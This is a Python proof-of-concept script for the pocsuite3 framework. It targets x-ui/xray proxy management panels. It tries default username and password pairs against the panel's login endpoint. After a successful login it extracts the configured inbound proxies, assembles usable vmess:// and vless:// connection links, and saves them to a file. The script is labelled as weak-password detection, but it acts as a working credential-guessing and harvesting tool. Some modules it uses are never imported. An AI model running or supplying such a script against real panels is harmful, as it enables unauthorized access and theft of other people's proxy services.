from pocsuite3.api import *
import base64


class XuiPOC(POCBase):
vulID = '10001'  # ssvid
version = '3.0'
author = ['零乐']
vulDate = '2023-02-08'
createDate = '2023-02-08'
updateDate = '2023-02-08'
references = ['https://www.0le.cn']
name = 'x-ui,xray-弱密码检测'
appName = 'x-ui'
appVersion = 'all'
vulType = 'Weak password'
desc = '''
识别弱密码，并提取后台的v2ray 链接
'''
outfilename = "v2_out_" + str(int(time.time())) + ".txt"

r = requests.session()

def _verify(self):
result = {}

name = ['admin', 'root', 'test']
password = ['123456', 'admin', 'test']

for i in name:
for j in password:
rsp = self.r.post(self.url + "/login", data={



"username": i,
"password": j
}, timeout=3).text
if '''{"success":true''' in rsp:
result['AdminInfo'] = {}
result['AdminInfo']['Username'] = i
result['AdminInfo']['Password'] = j
vmess = ""
vless = ""

rsp = json.loads(self.r.post(self.url + "/xui/inbound/list").text)
try:
data_group = rsp['obj']
for i in data_group:
protocol = i['protocol']
port = str(i['port'])
remark = str(i['remark'])

setting = json.loads(i['settings'])
streamSettings = json.loads(i['streamSettings'])
v2id = str(setting['clients'][0]['id'])
network = streamSettings['network']
security = streamSettings['security']

typee = "none"
host = ""
path = ""
add = urlparse(self.url).hostname
grep = re.findall(f'type\": \"(.* ?)\"', i['streamSettings'])
if grep:
typee = grep[0]
grep = re.findall(f'Host\": \"(.* ?)\"', i['streamSettings'])
if grep:
host = grep[0]
grep = re.findall(f'path\": \"(.* ?)\"', i['streamSettings'])
if grep:
path = grep[0]

if security == "tls":
grep = re.findall(f'serverName\": \"(.* ?)\"', i['streamSettings'])
if grep:
add = grep[0]

if protocol == "vless":
flow = str(setting['clients'][0]['flow'])
vless = "vless://" + v2id + "@" + urlparse(
self.url).hostname + ":" + port + "?type=" + network + "&security=" + security + "&flow=" + flow + "#" + remark
result['extra'] = {}
result['extra']['vless'] = vless

if protocol == "vmess":
base = '''{
"v": "2",
"ps": "''' + remark + '''",
"add": "''' + add + '''",
"port": "''' + str(port) + '''",
"id": "''' + v2id + '''",
"aid": "0",
"net": "''' + network + '''",
"type": "''' + typee + '''",
"host": "''' + host + '''",
"path": "''' + path + '''",
"tls": "''' + security + '''"
}'''
vmess = "vmess://" + str(base64.b64encode(base.encode("utf-8")), 'utf-8')

result['extra'] = {}
result['extra']['vmess'] = vmess

if vmess:
with open(self.outfilename, "a+") as f:
f.write(vmess + "\n")
break
if vless:
with open(self.outfilename, "a+") as f:
f.write(vless + "\n")
break
except:
pass

return self.parse_output(result)
